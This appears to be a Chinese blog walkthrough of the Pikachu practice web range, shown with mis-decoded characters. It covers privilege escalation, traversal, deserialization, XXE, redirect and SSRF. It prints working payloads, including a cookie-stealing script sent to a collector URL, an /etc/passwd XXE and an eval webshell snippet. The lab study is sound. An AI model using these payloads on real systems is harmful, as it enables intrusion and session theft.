<p>ä¸Šä¼ åçš„æ˜¯pngå›¾ç‰‡ï¼Œä¸ä¼šè¢«å½“æˆphpè„šæœ¬è§£æ</p>
<p>åˆ©ç”¨å‰é¢çš„æ–‡ä»¶åŒ…å«æ¼æ´æ‰“<strong>ç»„åˆæ‹³</strong>ï¼š<br><code>http://www.pikachu.com/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/11/23/203135619c5879b7563285308197.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code><br>èšå‰‘èƒ½å¤Ÿè¿æ¥è¿™ä¸ªURL</p>
<h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><h3 id="æ¦‚è¿°-7"><a href="#æ¦‚è¿°-7" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>è¶Šæƒï¼Œå°±æ˜¯è¶Šæƒ<br>åˆæœ‰åˆ†æ°´å¹³è¶Šæƒå’Œå‚ç›´è¶Šæƒä¸¤ç§</p>
<p>æƒé™ç®¡ç†ä¸€èˆ¬åº”éµå¾ªçš„åŸåˆ™ï¼š</p>
<ul>
<li>ä½¿ç”¨æœ€å°ç‰¹æƒåŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œæˆæƒ</li>
<li>ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™</li>
<li>ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæƒé™åˆ¤æ–­æ¡ä»¶ï¼Œå°½é‡é¿å…ä½¿ç”¨å‰ç«¯ä¼ å…¥æ¡ä»¶</li>
</ul>
<h3 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h3><p>lucyç”¨æˆ·ç™»å…¥ï¼ŒæŸ¥çœ‹ä¿¡æ¯ï¼Œå‘ç°URLé‡Œæœ‰ä¸ªusernameå‚æ•°æŒ‡å®šäº†æ˜¯lucy<br>æ”¹æˆliliï¼Œå°±ä»¥ç”¨æˆ·lucyè¶Šæƒçœ‹åˆ°äº†liliçš„ä¿¡æ¯</p>
<p>å°±æ˜¯è¯´ï¼Œå‰é¢çš„ç™»å…¥æ˜¯å¤šä½™çš„ï¼Œæ˜¯å¤±æ•ˆé‰´æƒ</p>
<h3 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h3><p>ä¸¤ä¸ªç”¨æˆ·ï¼Œpikachuå°±æ˜¯ä¸ªå®å¯æ¢¦ï¼Œè€Œadminæ˜¯è¶…çº§ç”¨æˆ·<br>pikachuåªèƒ½çœ‹ï¼Œè€Œadminè¿˜èƒ½å¢åˆ ç”¨æˆ·</p>
<p><del>é¶åœºè¿™é‡Œæ¯”è¾ƒä¸æ–¹ä¾¿ï¼Œä¸ç®¡ä»€ä¹ˆç”¨æˆ·éƒ½åªç”¨ä¸€ä¸ªPHPSESSIDæ ‡è¯†æµè§ˆå™¨</del><br><del>æ‰€ä»¥kalié‡Œé¢åªæœ‰ä¸€ä¸ªæµè§ˆå™¨çš„è¯ï¼Œä¸å¤ªå¥½æµ‹è¯•è¶Šæƒ</del><br><del>ä½†æ˜¯å¯ä»¥ä½¿ç”¨curlå‘½ä»¤</del><br>æˆ‘æ˜¯å‚»é€¼</p>
<p>å…ˆåœ¨æµè§ˆå™¨ä¸Šåˆ†åˆ«ç™»å…¥ä¸¤ä¸ªç”¨æˆ·ï¼Œå¹¶å„è‡ªæ‰§è¡Œç‰¹æ®Šæ“ä½œ<br>æŠ“åŒ…çœ‹çœ‹è¯·æ±‚æ¥å£å’Œå‘é€çš„æ•°æ®<br>çŒœæµ‹ä¸€äº›ç®¡ç†å‘˜æ¥å£æ²¡æœ‰åšé‰´æƒ</p>
<p>äºæ˜¯æŠŠç®¡ç†å‘˜æ·»åŠ ç”¨æˆ·çš„æ•°æ®åŒ…æ”¾åˆ°repeater<br>ç„¶åé€€å‡ºadminï¼Œç™»å…¥pikachuï¼Œè·å¾—pikachuçš„ç™»å½•æ€<br>ç„¶åæŠŠé‚£ä¸ªæ•°æ®åŒ…çš„PHPSESSIDæ¢æˆpikachuçš„<br>é‡æ”¾ï¼Œå°±ç›¸å½“äºä»¥pikachuæ‰§è¡Œadminçš„æ“ä½œ<br>ç»“æœæˆåŠŸï¼Œå³å­˜åœ¨å‚ç›´è¶Šæƒ</p>
<hr>
<p>ä¸‹é¢æ˜¯ä¸€äº›curlçš„å‘½ä»¤ï¼ˆè™½ç„¶æ˜¯çŠ¯å‚»ï¼Œä½†ä¹Ÿé¡ºä¾¿å­¦ä¹ ä¸€éï¼‰</p>
<p>ç™»å…¥ï¼š<br><code>curl http://www.pikachu.com/vul/overpermission/op2/op2_login.php -L -b &quot;PHPSESSID=gns88d3jopdfi4reg0t1lesag1&quot; -d &quot;username=pikachu&amp;password=000000&amp;submit=Login&quot; | sed -n &#39;/&lt;div class=&quot;main-content/,/&lt;div class=&quot;footer/p&#39;</code></p>
<p>æ‰§è¡Œadminæ“ä½œï¼š<br><code>curl http://www.pikachu.com/vul/overpermission/op2/op2_admin_edit.php -L -b &quot;PHPSESSID=gns88d3jopdfi4reg0t1lesag1&quot; -d &quot;username=Archeri&amp;password=password&amp;sex=111&amp;phonenum=111&amp;email=111&amp;address=111&amp;submit=%E5%88%9B%E5%BB%BA&quot; | sed -n &#39;/&lt;div class=&quot;main-content/,/&lt;div class=&quot;footer/p&#39;</code></p>
<h2 id=""><a href="#" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h3 id="æ¦‚è¿°-8"><a href="#æ¦‚è¿°-8" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>å·®ä¸å¤šä¹Ÿæ˜¯è¯·æ±‚æ–‡ä»¶çš„å˜é‡è¢«ç”¨æˆ·æ§åˆ¶å¹¶æ²¡æœ‰ä¸¥æ ¼é™åˆ¶<br>å¯¼è‡´ç›®å½•éå†</p>
<p>å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²çš„åŒºåˆ«ï¼š<br>é€šè¿‡ä¸å¸¦å‚æ•°çš„URLï¼ˆæ¯”å¦‚ï¼š<a target="_blank" rel="noopener" href="http://xxx/doc%EF%BC%89%E5%AF%BC%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E8%BF%99%E5%8F%AB%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">http://XXX/docï¼‰å¯¼å‡ºäº†docæ–‡ä»¶å¤¹é‡Œçš„å†…å®¹ï¼Œè¿™å«æ•æ„Ÿä¿¡æ¯æ³„éœ²</a><br>å¸¦å‚æ•°ï¼Œä¸”èƒ½å¤Ÿç”¨..&#x2F;..&#x2F;ï¼Œä¸€èˆ¬å«ç›®å½•éå†</p>
<h3 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>ä¸¤ä¸ªé“¾æ¥ï¼Œç‚¹å‡»ä¹‹åä¸‹é¢å‡ºç°å¯¹åº”æ–‡æœ¬<br>å…¶ä¸­URLé‡Œæœ‰ä¸ªå€¼å¾—æ³¨æ„çš„å‚æ•°ï¼š<code>?title=truman.php</code><br>è¿™é‡Œå°±æ˜¯æ¼æ´ç‚¹ï¼Œå’Œæ–‡ä»¶åŒ…å«å·®ä¸å¤š</p>
<h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><h3 id="æ¦‚è¿°-9"><a href="#æ¦‚è¿°-9" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ä¸€äº›å¸¸è§åœºæ™¯</p>
<ul>
<li>é€šè¿‡è®¿é—®URLä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨</li>
<li>è¾“å…¥é”™è¯¯çš„URLå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯</li>
<li>å‰ç«¯çš„æºç ï¼ˆHTMLã€CSSã€JSï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰</li>
</ul>
<h3 id="I-can-see-your-ABC"><a href="#I-can-see-your-ABC" class="headerlink" title="I can see your ABC"></a>I can see your ABC</h3><p>HTMLæºç é‡Œé¢ï¼Œæœ‰ä¸€æ®µæ³¨é‡Šæš´éœ²äº†æµ‹è¯•è´¦å·ï¼šlili&#x2F;123456</p>
<p>è¿˜æœ‰ä¸€ä¸ªé€»è¾‘é”™è¯¯ï¼Œè®°ä¸‹ç™»é™†åçš„URLï¼Œé€€å‡ºç™»å½•åå¯ä»¥æ— æˆæƒè®¿é—®</p>
<h2 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h2><h3 id="æ¦‚è¿°-10"><a href="#æ¦‚è¿°-10" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>PHPçš„ä¸¤ä¸ªå‡½æ•°</p>
<p>**serialize()**ï¼šæŠŠå¯¹è±¡å˜æˆå¯ä¼ è¾“çš„å­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();		<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);	<span class="comment">//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span></span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–åçš„ç»“æœï¼š<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</code></p>
<ul>
<li><p>Oï¼šè¡¨ç¤ºObject</p>
</li>
<li><p>1ï¼šè¡¨ç¤ºå¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦</p>
</li>
<li><p>â€œSâ€ï¼šå¯¹è±¡åç§°</p>
</li>
<li><p>1ï¼šå¯¹è±¡é‡Œæœ‰ä¸€ä¸ªå˜é‡</p>
</li>
<li><p>sï¼šæ•°æ®ç±»å‹ï¼ˆå­—ç¬¦ä¸²ï¼‰</p>
</li>
<li><p>4ï¼šå˜é‡åç§°é•¿åº¦</p>
</li>
<li><p>â€œtestâ€ï¼šå˜é‡åç§°</p>
</li>
<li><p>sï¼šæ•°æ®ç±»å‹</p>
</li>
<li><p>7ï¼šå˜é‡å€¼é•¿åº¦</p>
</li>
<li><p>â€œpikachuâ€ï¼šå˜é‡å€¼</p>
</li>
</ul>
<hr>
<p>**unserialize()**ï¼šå°†è¢«åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²çš„å¯¹è±¡è¿˜åŸ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$u</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test;	<span class="comment">//å¾—åˆ°çš„ç»“æœä¸ºpikachu</span></span><br></pre></td></tr></table></figure>

<hr>
<p>å¦‚æœååºåˆ—åŒ–å†…å®¹èƒ½è¢«ç”¨æˆ·æ§åˆ¶<br>ä¸”åå°ä¸æ­£å½“ä½¿ç”¨PHPä¸­çš„é­”æ³•å‡½æ•°<br>åˆ™å¯èƒ½æœ‰å®‰å…¨é—®é¢˜</p>
<p>ä¸€äº›å¸¸è§çš„ç›¸å…³é­”æ³•å‡½æ•°ï¼š</p>
<ul>
<li><p>__construct()ï¼šå¯¹è±¡åˆ›å»ºæ—¶è°ƒç”¨</p>
</li>
<li><p>__destruct()ï¼šå¯¹è±¡é”€æ¯æ—¶è°ƒç”¨</p>
</li>
<li><p>__toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶è°ƒç”¨</p>
</li>
<li><p>__sleep()ï¼šå¯¹è±¡è¢«åºåˆ—åŒ–å‰è¿è¡Œ</p>
</li>
<li><p>__wakeup()ï¼šå¯¹è±¡åºåˆ—åŒ–ä¹‹åç«‹å³è°ƒç”¨</p>
</li>
</ul>
<hr>
<p>ä¸€ä¸ªæ¼æ´ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>payloadï¼š<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
<p>å¤§æ¦‚å°±æ˜¯ä¼ å…¥æ¶æ„å­—ç¬¦ä¸²ï¼Œååºåˆ—åŒ–ä¹‹åæ‰§è¡Œechoè¾¾æˆXSSçš„æ„æ€</p>
<h3 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>åç«¯ç›¸å…³æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;å¤§å…„å¼Ÿ,æ¥ç‚¹åŠ²çˆ†ç‚¹å„¿çš„!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åé¢echo $htmlåœ¨é¡µé¢ä¸­</span></span><br></pre></td></tr></table></figure>

<p>ä¼°è®¡ååºåˆ—åŒ–æ¼æ´ï¼Œä¸€èˆ¬éƒ½æ˜¯ç™½ç›’æµ‹è¯•ä»£ç å®¡è®¡å‡ºæ¥çš„å§</p>
<p>æ ¹æ®ä¸Šé¢çš„æºç ï¼ŒçŸ¥é“å¯¹è±¡Sä¼šåœ¨åˆ›å»ºæ—¶echoè‡ªå·±çš„å˜é‡<br>ä½†å…¶å®è¿™ä¸ªä¸é‡è¦<br>é‡è¦çš„æ˜¯ä¸‹é¢çš„ä»£ç ï¼Œä¼šå°è¯•ååºåˆ—åŒ–åï¼ŒæŠŠ<code>$html</code>çš„å†…å®¹echoå‡ºæ¥</p>
<p>æ‰€ä»¥å°±æœ‰ä¸€ä¸ªå¾ˆæ™®é€šçš„XSS<br>æ‰€ä»¥æœ€åŸºæœ¬çš„å¼¹çª—payloadï¼š<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code><br>åé¢ä¿®æ”¹å˜é‡çš„é•¿åº¦å’Œå­—ç¬¦ä¸²å€¼ï¼Œå°±å¯ä»¥è¾¾æˆå…¶ä»–ç›®çš„<br>ä¾‹å¦‚æ”¶é›†cookieï¼š<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:109:&quot;&lt;script&gt;document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;&quot;;&#125;</code></p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="æ¦‚è¿°-11"><a href="#æ¦‚è¿°-11" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œåˆæ¥å•¦</p>
<p>é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„XMLå®ä½“å†…å®¹<br>è®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´é—®é¢˜</p>
<p>ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æXMLçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„<br>ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´<br>ä»¥PHPä¸ºä¾‹<br>åœ¨PHPé‡Œé¢è§£æXMLç”¨çš„æ˜¯libxml<br>å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­é»˜è®¤æ˜¯ç¦æ­¢è§£æXMLå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚</p>
<p>é¶åœºæ‰‹åŠ¨æŒ‡å®šLIBXML_NOENTé€‰é¡¹å¼€å¯äº†XMLå¤–éƒ¨å®ä½“è§£æ</p>
<p>æ€»ä¹‹å¾ˆå¯èƒ½å‡ºç°åœ¨æ¥æ”¶å’Œè§£æXMLæ•°æ®çš„åœ°æ–¹</p>
<h3 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>æœ¬åœ°å¤ç°8å¤ªè¡Œï¼ŒæŒ‰ç…§æç¤ºURLç¼–ç ä¹Ÿä¸è¡Œ<br>å¯èƒ½æ˜¯ç¯å¢ƒé…ç½®çš„é—®é¢˜ï¼Œä¸‹é¢æ˜¯payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ä¸å®‰å…¨çš„URLé‡å®šå‘"><a href="#ä¸å®‰å…¨çš„URLé‡å®šå‘" class="headerlink" title="ä¸å®‰å…¨çš„URLé‡å®šå‘"></a>ä¸å®‰å…¨çš„URLé‡å®šå‘</h2><h3 id="æ¦‚è¿°-12"><a href="#æ¦‚è¿°-12" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†URLè·³è½¬çš„åœ°æ–¹<br>ä¸»è¦æ˜¯åç«¯å¯¹å‰ç«¯ä¼ è¿‡æ¥çš„å‚æ•°æ²¡æœ‰åŠ ä»¥åˆ¤æ–­å°±å»è·³è½¬</p>
<p>ä¸€ä¸ªç›´æ¥å±å®³ï¼šé’“é±¼<br>å³æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸååšæ©ç›–ï¼Œä»è€Œè·³è½¬åˆ°é’“é±¼ç½‘ç«™</p>
<h3 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>å››ä¸ªç‚¹å‡»é¡¹ï¼Œå…¶ä¸­åé¢ä¸¤ä¸ªå‘å‡ºçš„è¯·æ±‚æœ‰ä¸ªå‚æ•°<code>url</code><br>çœ‹æ ·å­æ˜¯é¡µé¢ä¼šæ ¹æ®è¿™ä¸ªå‚æ•°çš„å€¼è¿›è¡Œè·³è½¬</p>
<p>é‚£å¯èƒ½æœ‰è¿™ä¸ªpayloadï¼š<br><code>http://www.pikachu.com/vul/urlredirect/urlredirect.php?url=http://www.baidu.com</code></p>
<p>å°±æ˜¯åˆ©ç”¨pikachuçš„åŸŸåé’“åˆ°ç™¾åº¦å»çš„æ„æ€ï¼Ÿ</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="æ¦‚è¿°-13"><a href="#æ¦‚è¿°-13" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ä¸»è¦åŸå› ï¼š<br>æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½<br>ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</p>
<p>å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„åœ°å€æ¥è®©åç«¯å¯¹å…¶å‘èµ·è¯·æ±‚<br>å¹¶è¿”å›è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</p>
<p>PHPä¸­çš„å¸¸è§ç›¸å…³å‡½æ•°ï¼ˆåˆ©ç”¨æ–¹æ³•å’Œå½±å“ä¸åŒï¼‰ï¼š</p>
<ul>
<li>file_get_contents()</li>
<li>fsockopen()</li>
<li>curl_exec()</li>
</ul>
<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>çœ‹æ ·å­ä¼°è®¡æ˜¯ä¼šä½¿ç”¨curlå¯¹å‚æ•°<code>url</code>ä¸­çš„ç½‘å€è¿›è¡Œè¯·æ±‚<br>ä¼°è®¡åˆ©ç”¨ç‚¹å°±æ˜¯ï¼Œè¯·æ±‚æ”»å‡»è€…æœåŠ¡å™¨ä¸Šçš„æ¶æ„è„šæœ¬<br>åœ¨å—å®³è€…æœåŠ¡å™¨ä¸Šè¿è¡Œ</p>
<p>æˆ–è€…å¯ä»¥æ¢æµ‹å†…ç½‘ï¼š<code>http://10.10.10.2:3306</code></p>
<h3 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h3><p>ä¼°è®¡å°±æ˜¯é€šè¿‡<code>file</code>å‚æ•°è·å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿä¿¡æ¯<br>å¥½åƒä¹Ÿå¯ä»¥èµ·åˆ°å’Œcurlç±»ä¼¼çš„æ•ˆæœ</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¾ˆç®€é™‹çš„é¶åœº<br>æç¤ºå’Œæ²¡æç¤ºä¸€æ ·</p>
	
		</div>
		
		<div id="current-post-cover" data-scr="/img/post-cover/default.jpg"></div>

		<!-- relate post, comment...-->
		<div class="investment-container">
			<div class="investment-header">
				<div class="investment-title-1">
					<div class="on">ç›¸å…³æ–‡ç« </div>
					<div>è¯„è®º</div>
					<!-- <div>åˆ†äº«</div> -->
				</div>
				<div class="investment-title-2">	            
					
	<span>
		<a id="totop-post-page">è¿”å›é¡¶éƒ¨</a>
		
			<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Webé¶åœº-DSVW" rel="prev">
				&laquo;ä¸Šä¸€ç¯‡
			</a>
		
		
			<a href="/2022/09/28/%E3%80%8APython-Guide%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="ã€ŠPython Guideã€‹å­¦ä¹ ç¬”è®°" rel="next">
				ä¸‹ä¸€ç¯‡&raquo;
			</a>
			
	</span>


      		
				</div>	
			</div>
			
			<div class="investment-content">
				<div class="investment-content-list">
					

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Webé¶åœº-upload-labs">
								Webé¶åœº-upload-labs			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								å…­æœˆ 4æ—¥, 2023				
							</p>
							<p class="relate-post-content">
								ç¯å¢ƒæ”»å‡»æœºï¼škali 10.10.10.128é¶æœºï¼šDebian 11.1 x64 
Pass-01ä»»åŠ¡ï¼šä¸Šä¼ ä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨
ç›´æ¥æ€¼ï¼Œæ˜¾ç¤ºï¼š

æ”¹æˆbasic.jpgï¼Œç‚¹å‡»ä¸Šä¼ åbpæŠ“åŒ…ï¼Œä¿®æ”¹åç¼€ä¸º.phpï¼Œä¸Šä¼ æˆåŠŸäº†ï¼š...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Webé¶åœº-upload-labs">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Webé¶åœº-upload-labs"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Webæ¸—é€ä¸­å¸¸è§çš„é«˜å±å‡½æ•°ä»¥åŠä¼ªåè®®">
								PHP-Webæ¸—é€ä¸­å¸¸è§çš„é«˜å±å‡½æ•°ä»¥åŠä¼ªåè®®			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								äº”æœˆ 4æ—¥, 2023				
							</p>
							<p class="relate-post-content">
								ä»£ç æ‰§è¡Œå‡½æ•°eval
ä»£ç ï¼š&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
åˆ©ç”¨ï¼šhttp://10.10.10.3/test.php?cmd=phpinfo();
assert
ä»£ç ï¼š&lt;?...
							</p>
						</div>

						<div class="relate-post-cover">
